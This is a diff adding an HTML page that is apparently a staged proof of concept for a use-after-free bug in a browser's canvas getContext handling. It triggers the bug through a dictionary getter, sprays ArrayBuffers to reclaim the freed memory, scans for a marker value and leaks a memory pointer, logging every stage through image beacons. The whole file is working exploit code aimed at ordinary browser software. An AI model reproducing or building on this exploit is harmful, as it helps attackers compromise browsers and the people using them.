@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V598</title></head>
+<body><pre id="out">V598 — UAF step-by-step crash isolation</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  try{new Image().src='/beacon/V598-'+tag+'?d='+encodeURIComponent(String(d).slice(0,600))+'&t='+Date.now();}catch(e){}
+}
+
+bk('S0','boot');
+
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+bk('S1','canvas');
+
+var innerCtx=null;
+var dict={};
+Object.defineProperty(dict,'alpha',{get:function(){
+  innerCtx=canvas.getContext('2d');
+  if(!innerCtx)return true;
+  for(var i=0;i<8;i++)innerCtx.save();
+  innerCtx.lineWidth=6.02214076e23;
+  return true;
+}});
+bk('S2','dict');
+
+var bmr=null;
+try{bmr=canvas.getContext('bitmaprenderer',dict);}catch(e){bk('S3e',e.name);}
+bk('S3','bmr='+!!bmr+',inner='+!!innerCtx);
+
+/* S4: immediate lineWidth read — THE critical test.
+ * If this crashes, freed context m_stateStack is inaccessible. */
+if(innerCtx){
+  var lw='?';
+  try{lw=innerCtx.lineWidth;}catch(e){lw='ERR:'+e.name;}
+  bk('S4','lw='+lw);
+
+  /* S5: read more fields */
+  var ml='?',ga='?',ss='?';
+  try{ml=innerCtx.miterLimit;}catch(e){ml='ERR:'+e.name;}
+  try{ga=innerCtx.globalAlpha;}catch(e){ga='ERR:'+e.name;}
+  bk('S5','ml='+ml+',ga='+ga);
+
+  /* S6: try strokeStyle (string getter — complex path) */
+  try{ss=innerCtx.strokeStyle;}catch(e){ss='ERR:'+e.name;}
+  bk('S6','ss='+ss);
+
+  /* S7: spray 10 ABs of 6400B and re-read */
+  var abs=[];
+  for(var i=0;i<10;i++)abs[i]=new ArrayBuffer(6400);
+  var lw2='?';
+  try{lw2=innerCtx.lineWidth;}catch(e){lw2='ERR:'+e.name;}
+  bk('S7','spray10,lw='+lw2);
+
+  /* S8: spray 100 more */
+  for(var i=0;i<100;i++)abs.push(new ArrayBuffer(6400));
+  var lw3='?';
+  try{lw3=innerCtx.lineWidth;}catch(e){lw3='ERR:'+e.name;}
+  bk('S8','spray100,lw='+lw3);
+
+  /* S9: spray 400 more */
+  for(var i=0;i<400;i++)abs.push(new ArrayBuffer(6400));
+  var lw4='?';
+  try{lw4=innerCtx.lineWidth;}catch(e){lw4='ERR:'+e.name;}
+  bk('S9','spray400,lw='+lw4);
+
+  /* S10: if any lineWidth is 0, buffer was reclaimed — do write-through */
+  if(lw4===0||lw3===0||lw2===0){
+    bk('S10','RECLAIMED');
+    try{
+      innerCtx.lineWidth=1.717;
+      var f64=new Float64Array(1),u32=new Uint32Array(f64.buffer);
+      f64[0]=1.717;var wtLo=u32[0],wtHi=u32[1];
+      var hitI=-1,hitO=-1;
+      for(var ai=0;ai<abs.length&&hitI<0;ai++){
+        var fv=new Float64Array(abs[ai]);
+        for(var k=0;k<fv.length;k++){
+          if(fv[k]===1.717){hitI=ai;hitO=k*8;break;}
+        }
+      }
+      bk('S11','hit='+hitI+',off='+hitO);
+
+      if(hitI>=0){
+        try{innerCtx.setLineDash([1.5,2.5,3.5,4.5]);}catch(e){}
+        var dv=new DataView(abs[hitI]);
+        var ldOff=hitO+120;
+        if(ldOff+8<=abs[hitI].byteLength){
+          var pLo=dv.getUint32(ldOff,true),pH=dv.getUint32(ldOff+4,true);
+          bk('S12','***PTR=0x'+('00000000'+pH.toString(16)).slice(-8)+('00000000'+pLo.toString(16)).slice(-8)+'***');
+        }
+      }
+    }catch(e){bk('S10e',e.name);}
+  }
+
+  canvas._abs=abs;
+}else{
+  bk('S4','no-inner');
+}
+
+bk('DONE','v598');
+</script>
+</body></html>
